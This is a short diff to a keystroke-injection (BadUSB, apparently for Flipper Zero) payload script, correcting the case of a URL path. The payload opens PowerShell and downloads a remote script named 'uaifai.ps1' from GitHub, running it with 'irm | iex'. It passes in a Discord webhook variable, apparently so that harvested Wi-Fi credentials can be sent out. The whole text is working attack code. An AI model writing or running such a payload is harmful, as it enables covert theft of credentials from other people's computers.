@@ -11,7 +11,7 @@ DELAY 500
 STRING powershell
 ENTER
 DELAY 1500
-STRING $dc='your Discord webhook';irm https://raw.githubusercontent.com/Desko21/FlipperZero/refs/heads/main/Uaifai/uaifai.ps1 | iex
+STRING $dc='your Discord webhook';irm https://raw.githubusercontent.com/Desko21/FlipperZero/refs/heads/main/UaiFai/uaifai.ps1 | iex
 ENTER
 STRING exit
 ENTER
